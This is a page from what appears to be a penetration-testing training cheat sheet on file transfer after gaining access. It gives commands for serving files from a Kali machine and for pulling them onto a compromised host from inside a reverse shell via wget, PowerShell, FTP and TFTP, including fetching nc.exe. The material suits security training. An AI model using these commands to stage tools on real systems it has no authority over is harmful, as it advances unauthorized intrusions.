File Transfer 


Simple Local Web Servers (for serving shells, etc)

    Run a basic http server
    python -m SimpleHTTPServer 80

    Run a basic Python3 http server
    python3 -m http.server

    Run a ruby webrick basic http server
    ruby -rwebrick -e "WEBrick::HTTPServer.new
    (:Port => 80, :DocumentRoot => Dir.pwd).start"

    Run a basic PHP http server
    php -S $ip:80
    
 Dowload to target machine    

    https://insekurity.wordpress.com/2012/05/15/file-transfer/
    https://www.cheatography.com/fred/cheat-sheets/file-transfers/
    https://blog.ropnop.com/transferring-files-from-kali-to-windows/
    https://linux.die.net/man/1/scp
    https://www.freebsd.org/cgi/man.cgi?fetch(1)
    https://curl.haxx.se/docs/manpage.html
    https://linux.die.net/man/1/wget


HTTP
 The most common file transfer method.
# In Kali
python -m SimpleHTTPServer 80


# In reverse shell - Linux
wget target/file


# In reverse shell - Windows
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://target/file.exe','C:\Users\ user\Desktop\file.exe')"


FTP
This process can be mundane, a quick tip would be to be to name the filename as ‘file’ on your kali machine so that you don’t have to re-write the script multiple names, you can then rename the file on windows.
# In Kali
python -m pyftpdlib -p 21 -w
# In reverse shell
echo open target > ftp.txt
echo USER anonymous >> ftp.txt echo ftp >> ftp.txt
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt
  https://www.infosectrain.com/
Page 19
 # Execute
ftp -v -n -s:ftp.txt


TFTP
Generic.
# In Kali
atftpd --daemon --port 69 /tftp
# In reverse shell
tftp -i target GET nc.exe
